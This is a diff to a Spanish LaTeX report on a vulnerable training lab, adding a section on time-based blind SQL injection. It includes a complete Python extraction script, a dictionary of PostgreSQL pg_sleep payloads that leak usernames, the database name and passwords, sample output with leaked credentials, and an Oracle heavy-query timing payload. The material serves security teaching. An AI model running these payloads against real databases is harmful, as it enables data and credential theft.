@@ -2361,7 +2361,29 @@ def main():
 
 \section{Inyección Blind basada en tiempo}
 
-La inyección SQL basada en tiempo es una técnica utilizada para explotar vulnerabilidades en aplicaciones que interactúan con bases de datos. Este tipo de ataque pertenece a la categoría de \textbf{inyección SQL ciega} y se caracteriza por depender del tiempo de respuesta del servidor para deducir información de la base de datos.
+Para acceder a la sección específica para esta inyección en el laboratorio, una vez desplegado
+el servidor, se debe seleccionar la opción Time-Based Blind SQL Injection, en
+PostgreSQL. Se ha decidido no incluir la inyección en Oracle, ya que Oracle no admite directamente una
+función de espera como \texttt{pg\_sleep} en PostgreSQL, lo que dificulta la implementación de este tipo de inyección.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/time_blind1.png}
+    \caption{Selección de la sección Time-Based Blind SQL Injection}
+\end{figure}
+
+Para la simulación del ataque usaremos el formulario que muestra la intercepción de una petición con la cookie de sesión, ya explicado en la sección anterior.
+ 
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind3.png}
+    \caption{Formulario de cookie de sesión}
+\end{figure}
+
+
+\subsection{Descripción}
+
+La inyección SQL basada en tiempo es una técnica utilizada para explotar vulnerabilidades en aplicaciones que interactúan con bases de datos. Este tipo de ataque pertenece a la categoría de \textbf{inyección SQL a ciegas} y se caracteriza por depender del tiempo de respuesta del servidor para deducir información de la base de datos.
 
 \subsection{¿Cómo Funciona?}
 
@@ -2505,8 +2527,280 @@ A continuación, se presentan tres ejemplos concretos de inyecciones, cada uno o
 Estas tres variantes ilustran cómo el atacante, combinando condiciones lógicas, funciones de truncado de cadena y funciones de pausa (como \texttt{pg\_sleep}), puede filtrar información sensible de una base de datos paso a paso. El mecanismo se basa en la misma idea fundamental: el retraso deliberado confirma una hipótesis y la ausencia de retraso la niega, funcionando así como un canal encubierto de extracción de datos.
 
 
+\subsection{Script Implementado}
+
+Se ha desarrollado un script en Python que automatiza el proceso de inyecciones SQL basadas en tiempo, permitiendo extraer información sensible de la base de datos de forma eficiente. El script interactúa con el servidor vulnerable, enviando inyecciones y analizando las respuestas para deducir carácter por carácter los valores de los campos deseados.
+El script presenta una barra de progreso que indica el estado de la extracción y muestra el resultado final una vez completado el proceso.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/Time_Blind_Script.png}
+    \caption{Ejecución del script para inyecciones basadas en tiempo}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/Time_Blind_Script2.png}
+    \caption{Resultado de la extracción de usuarios de la base de datos}
+\end{figure}
+
+A continuación, se presenta el código completo del script utilizado para automatizar las inyecciones explicadas en esta sección. El script consta de dos archivos: uno que contiene el diccionario de inyecciones y otro con el código principal encargado de realizar las peticiones y procesar las respuestas. 
+
+\subsubsection{Código del Script}
+\begin{lstlisting}[language=Python]
+    from yaspin import yaspin
+    import time
+    import requests
+    import string
+    import signal
+    from termcolor import colored
+    import dic_inyecciones_time as dic
+    
+    # controlar CTRL+C
+    def signal_handler(sig, frame):
+        print('\nYou pressed Ctrl+C!')
+        exit(0)
+    
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    
+    def llamada_api(inyeccion):
+        data = {
+            "username": 'user1',
+            "password": inyeccion
+        }
+    
+        response = requests.post("http://127.0.0.1:5000/login/postgres/time_based", json=data)
+    
+        return response
+    
+    
+    def menu_inyecciones():
+        print(colored("[+] Elige una inyección introduciendo su numero:", "red"))
+        lista_inyecciones = list(dic.diccionario_inyecciones.keys())
+        while True:
+            for i, iny in enumerate(lista_inyecciones):
+                print(colored(f"{i + 1}", "magenta") + f":{iny.title()}")
+    
+            inyeccion = input("Inyección: ")
+            try:
+                if int(inyeccion) - 1 < len(lista_inyecciones):
+                    return dic.diccionario_inyecciones[lista_inyecciones[int(inyeccion) - 1]]
+                else:
+                    raise Exception
+            except Exception:
+                print(colored("[!] Introduce un numero valido", "red"))
+    
+    
+    def main():
+        # Configurar el total de pasos
+        total_steps = 100
+    
+        # Inicializar la palabra a adivinar
+        palabra = ""
+    
+        # Menu de inyecciones
+        inyeccion = menu_inyecciones()
+    
+        # Crear un spinner con el texto inicial
+        with yaspin(text="Extrayendo usuarios de la BD: ", color="red") as spinner:
+    
+            # Obtener todas las letras (mayúsculas y minúsculas) y dígitos
+            conjunto_car = list(string.ascii_letters + string.digits)
+    
+            # Añadir ',' al principio de la lista
+            conjunto_car.insert(0, ",")
+            conjunto_car.insert(0, ":")
+            for i in range(total_steps + 1):
+    
+                for letra in conjunto_car:
+                    tiempo_inicial = time.time()
+    
+                    nueva_inyeccion = dic.transformar_inyeccion(inyeccion, palabra + letra, len(palabra) + 1)
+                    llamada_api(nueva_inyeccion)
+    
+                    tiempo_final = time.time()
+                    tiempo_total = tiempo_final - tiempo_inicial
+    
+                    spinner.text = f"Extrayendo usuarios de la BD: {palabra + letra}"
+                    if tiempo_total > 1:
+                        palabra += letra
+                        break
+                    if letra == conjunto_car[-1]:
+                        spinner.color = "green"
+                        spinner.text = "Completado"
+                        spinner.ok("\char\"2714")
+                        print(f"\nRESULTADO: {palabra}")
+                        exit(0)
+    
+                # Actualizar el texto del spinner
+                spinner.text = f"Extrayendo usuarios de la BD: {palabra + letra}"
+    
+            # Cambiar el mensaje al finalizar
+            spinner.text = "Completado"
+            spinner.ok("\char\"2714")
+    
+    
+    if __name__ == "__main__":
+        main()
+    
+\end{lstlisting}
+
+\begin{figure}[H]
+    \begin{lstlisting}[language=Python]
+        import textwrap
+
+# {i} es la longitud de la palabra
+# {p} es la palabra a comprobar
+diccionario_inyecciones = {
+    "nombres de usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) <> '{p}' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) = '{p}' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
+    "nombres de la base de datos": """  '
+  AND (
+    left(current_database(), {i}) <> '{p}' 
+    OR (
+      left(current_database(), {i}) = '{p}' 
+      AND EXISTS (SELECT 1 FROM pg_sleep(1))
+    )
+  )
+--
+""",
+    "Usarios y Contraseñas concatenados": """ ' AND (
+    LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) <> '{p}'
+    OR (
+      LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) = '{p}'
+      AND EXISTS (SELECT 1 FROM pg_sleep(1))
+    )
+    )
+    --""",
+}
 
 
+def transformar_inyeccion(inyeccion: str, palabra: str, longitud: int):
+    inyeccion = inyeccion.replace("{i}", str(longitud))
+    inyeccion = inyeccion.replace("{p}", palabra)
+    # Eliminar la indentación
+    inyeccion = textwrap.dedent(inyeccion)
+    # Reemplazar saltos de línea y tabulaciones por espacios
+    inyeccion = ' '.join(line.strip() for line in inyeccion.splitlines())
+
+    return inyeccion
+
+
+if __name__ == "__main__":
+    print(transformar_inyeccion("nombres de usuario {i} {p}", "admin", 5))
+    \end{lstlisting}
+    \caption{Código del diccionario de inyecciones}
+\end{figure}
+
+
+\subsubsection{Resultados de los Ataques}
+\label{subsec:resultados_ataques}
+
+En esta subsección, se presentan los resultados obtenidos al ejecutar cada inyección implementada. Los resultados se interpretan basándose en el tiempo de respuesta observado en el servidor.
+
+\begin{itemize}
+    \item \textbf{Inyección para obtener nombres de usuario:}  
+    \begin{lstlisting}
+        [+] Elige una inyección introduciendo su número:
+        1:Nombres De Usuario
+        2:Nombres De La Base De Datos
+        3:Usarios Y Contraseñas Concatenados
+        Inyección: 1
+        Completado
+        
+        RESULTADO: admin,user1,user2        
+    \end{lstlisting}
+
+    \item \textbf{Inyección para obtener nombres de la base de datos:}  
+    \begin{lstlisting}
+        [+] Elige una inyección introduciendo su número:
+        1:Nombres De Usuario
+        2:Nombres De La Base De Datos
+        3:Usarios Y Contraseñas Concatenados
+        Inyección: 2
+        Completado
+        
+        RESULTADO: Empresa        
+    \end{lstlisting}
+
+    \item \textbf{Inyección para obtener usuarios y contraseñas concatenados:}  
+    \begin{lstlisting}
+        [+] Elige una inyección introduciendo su número:
+        1:Nombres De Usuario
+        2:Nombres De La Base De Datos
+        3:Usarios Y Contraseñas Concatenados
+        Inyección: 3
+        Completado
+        
+        RESULTADO: admin:password123,user1:password1,user2:password2        
+    \end{lstlisting}
+\end{itemize}
+
+
+\subsection{Posible método de ataque en Oracle}
+
+A diferencia de PostgreSQL, Oracle no cuenta con una función nativa directamente utilizable en sentencias SQL ordinarias para pausar la ejecución, como \texttt{pg\_sleep}. Existe una función nativa llamada \texttt{DBMS\_LOCK.SLEEP} que permite detener la ejecución por un tiempo determinado. Esta función puede ser utilizada en procedimientos \texttt{PL/SQL}, pero \textbf{no está disponible para ser invocada directamente dentro de una consulta SQL desde un programa o cliente externo}. 
+
+Esta limitación complica la implementación directa de ataques SQL basados en tiempo, ya que las consultas enviadas a través de aplicaciones no pueden incluir \texttt{DBMS\_LOCK.SLEEP} como parte de su lógica. No obstante, sigue siendo posible diseñar un ataque similar mediante el uso de operaciones matemáticas o consultas intensivas que introduzcan retardos significativos en la respuesta del servidor debido al alto costo computacional.
+
+\subsubsection{Estrategia General}
+
+El objetivo de este método de ataque es provocar un retraso perceptible en la respuesta del servidor al procesar una consulta. Este retardo, al igual que en los ataques basados en funciones de espera, actúa como una señal para el atacante, permitiéndole inferir si una condición específica es verdadera o falsa.
+
+\textbf{Elementos clave del ataque:}
+\begin{itemize}
+    \item \textbf{Operaciones complejas:} Utilizar funciones o cálculos que requieran una cantidad considerable de recursos, como exponentes de gran tamaño, combinaciones de funciones trigonométricas, o consultas intensivas sobre grandes volúmenes de datos.
+    \item \textbf{Condiciones lógicas:} Introducir un bloque condicional que ejecute la operación costosa solo si una hipótesis del atacante es verdadera.
+    \item \textbf{Medición del tiempo de respuesta:} Observar el comportamiento temporal del servidor para determinar si la condición lógica se cumplió o no.
+\end{itemize}
+
+\subsubsection{Ejemplo Práctico}
+
+Supongamos que queremos determinar el primer carácter del nombre de la base de datos en un entorno Oracle vulnerable. Una consulta maliciosa podría estructurarse de la siguiente manera:
+
+\begin{lstlisting}[language=SQL]
+' OR (CASE 
+        WHEN SUBSTR((SELECT global_name FROM global_name), 1, 1) = 'O' 
+        THEN (SELECT COUNT(*) 
+              FROM all_objects, all_objects, all_objects) 
+        ELSE 0 
+     END) = 0 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item La operación costosa es \texttt{SELECT COUNT(*) FROM all\_objects, all\_objects, all\_objects}, que genera una gran cantidad de combinaciones cartesianas al unir la vista \texttt{all\_objects} consigo misma tres veces. Esto obliga al servidor a realizar un cálculo intensivo.
+    \item Si el primer carácter del nombre de la base de datos es \texttt{'O'}, la operación costosa se ejecuta, provocando un retraso notable.
+    \item Si no lo es, se evalúa la rama alternativa (\texttt{ELSE 0}), que no introduce ningún retardo.
+    \item El atacante mide el tiempo de respuesta del servidor para determinar si el carácter coincide o no.
+\end{itemize}
+
+\subsubsection{Uso Limitado de \texttt{DBMS\_LOCK.SLEEP}}
+
+Aunque \texttt{DBMS\_LOCK.SLEEP} es una función nativa en Oracle diseñada para pausar la ejecución por un número específico de segundos, tiene una limitación importante: solo puede ser utilizada dentro de procedimientos o bloques \texttt{PL/SQL}. Esto significa que no puede incluirse directamente en sentencias SQL ejecutadas por un programa o cliente externo.
+
+Por ejemplo, un bloque \texttt{PL/SQL} que usa \texttt{DBMS\_LOCK.SLEEP} sería:
+
+\begin{lstlisting}[language=SQL]
+BEGIN
+    IF SUBSTR((SELECT global_name FROM global_name), 1, 1) = 'O' THEN
+        DBMS_LOCK.SLEEP(5);
+    END IF;
+END;
+\end{lstlisting}
+
+En este caso, el procedimiento puede introducir un retardo si se cumple la condición lógica. Sin embargo, este enfoque no es aplicable en ataques tradicionales basados en la interacción directa con consultas SQL desde un programa.
+
+\subsubsection{Limitaciones y Consideraciones}
+
+Si bien el uso de operaciones costosas y el mecanismo de \texttt{DBMS\_LOCK.SLEEP} (en casos específicos) permite implementar ataques basados en tiempo en Oracle, existen ciertas limitaciones inherentes:
+\begin{itemize}
+    \item \textbf{Carga del servidor:} Dependiendo de los recursos disponibles, el retardo podría no ser perceptible en servidores muy potentes.
+    \item \textbf{Restricciones de uso:} El uso de \texttt{DBMS\_LOCK.SLEEP} está limitado a bloques \texttt{PL/SQL}, lo que reduce las opciones para ataques SQL enviados directamente desde aplicaciones.
+    \item \textbf{Visibilidad:} Las operaciones costosas y los procedimientos \texttt{PL/SQL} pueden ser más fáciles de detectar en los registros de auditoría o mediante herramientas de monitoreo de rendimiento.
+    \item \textbf{Precisión:} Los tiempos de respuesta podrían variar debido a otros factores externos (como la carga del sistema), dificultando la interpretación de los resultados.
+\end{itemize}
 
 %Conclusiones (mostrar código de login seguro)
 \section{Conclusiones}
